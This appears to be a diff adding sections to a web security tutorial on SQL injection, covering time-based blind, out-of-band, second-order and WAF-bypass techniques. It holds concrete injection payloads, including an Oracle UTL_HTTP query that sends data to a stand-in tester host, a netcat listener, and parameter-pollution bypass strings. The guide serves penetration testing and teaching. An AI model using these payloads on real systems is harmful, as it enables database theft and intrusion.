@@ -181,3 +181,48 @@ of time delay. The exploitation starts by sending a query with a time delay to t
 <p><i>.?id=1+AND+if((ascii(lower(substring((select password from user limit 0,1),0,1))))=97,1,benchmark(2000000,md5(now())))</i></p>
 <p>We can conjecture that the character was guessed correctly on the basis of the time delay of the web server response; manipulating the value 2000000 we can achieve acceptable performance for a concrete 
 application; the function sleep() represents an analogue of the function benchmark(). The function sleep() is more secure in the given context because it doesn't use server resources.</p>
+
+<h1>Perform Blind SQL Injection using Out-of-Band Exploitation Technique</h1>
+<p>The out-of-band exploitation technique is useful when the tester encounters a blind SQL injection situation. It uses DBMS functions to perform an out-of-band connection and provide the results of the 
+injected query as part of the request to the tester's server.</p>
+<p>Each DBMS has its own functions; check for specific DBMS section.</p>
+<p>Consider the following SQL query:</p>
+<p><i>SELECT * FROM products WHERE id_product=$id_product</i></p>
+<p>Consider the request to a script that executes the query above:</p>
+<p><i>http://www.example.com/product.php?id=10</i></p>
+<p>The malicious request would be:</p>
+<p><i>http://www.example.com/product.php?id=10||UTL_HTTP.request('testerserver.com:80')||(SELECT user FROM DUAL)--</i></p>
+<p>In this example, the tester is concatenating the value 10 with the result of the function UTL_HTTP.request. This ORACLE function tries to connect to 'testerserver.com' and make an HTTP GET request containing
+the return from the query "SELECT user FROM DUAL"</p>
+<p>The tester can set up a web server (Apache) or use the Netcat tool:<br/>
+<i>/home/tester/nc -nLp 80</i><br/>
+<i>GET /SCOTT HTTP/1.1 Host: testerserver.com Connection: close</i></p>
+
+<h1>Exploiting Second-Order SQL Injection</h1>
+<p>Second-order SQL injection can be performed when the application uses submitted data to perform different application functions. To perform this type of SQL injection, an attacker needs to know how 
+submitted values are used later in the application. This attack is even possible when the web application uses the output escaping technique to accept inputs from users. The attacker submits a malicious 
+query with the requested query but does not cause any harm to the application's functionality. Later, when another function of the application uses the same query stored in the database to perform another 
+operation, the malicious query executes, allowing the attacker to perform SQL injection attacks on the application.</p>
+<p>Second-order SQL injection occurs when the data input is stored in the database and used for processing another SQL query without validation or without using parameterized queries. Depending on the backend 
+database, database connection settings and OS, an attacker can:</p>
+<p><ol>
+    <ul>Read, update, and delete arbitrary data or arbitrary tables from the db</ul>
+    <ul>Execute commands on the underlying OS</ul>
+</ol></p>
+
+<h1>Bypass Firewall using SQL Injection</h1>
+<p>Bypassing the WAF using SQL injection vulnerability is a major threat, as it is capable of retrieving the whole database from the server. Attackers use the following methods:</p>
+<h2>Normalization Method</h2>
+<p>If an attacker is able to detect any vulnerability in functional dependencies, the attacker changes the structure of the SQL query to perform the attack. Improper configuration of the WAF may lead to 
+vulnerabilities; in such cases an attacker can inject a malicious query:<br/>
+<i>/?id=1/*UNION*/union/*/SELECT*/select+1,2,3/*</i></p>
+<p>Once the WAF processes the malicious query, the request takes the following form:<br/>
+<i>SELECT * FROM TABLE WHERE ID = 1 UNION SELECT 1,2,3--</i></p>
+
+<h2>HPP Technique</h2>
+<p>HTTP parameter pollution (HPP) is an easy and effective technique that affects both the server and the client with the feasibility to override or add HTTP GET/POST parameters by injecting delimiting 
+characters in query strings.</p>
+<p>For example, if a WAF protects any website, then the following request does not allow the attacker to perform the attack:<br/>
+<i>/?id=1;select+1,2,3+from+users+where+id=1--</i></p>
+<p>An attacker will be able to bypass WAF by applying the HPP technique to the above query:<br/>
+<i>/?id=1;select+1&id=2,3+from+users+where+id=1--</i></p>
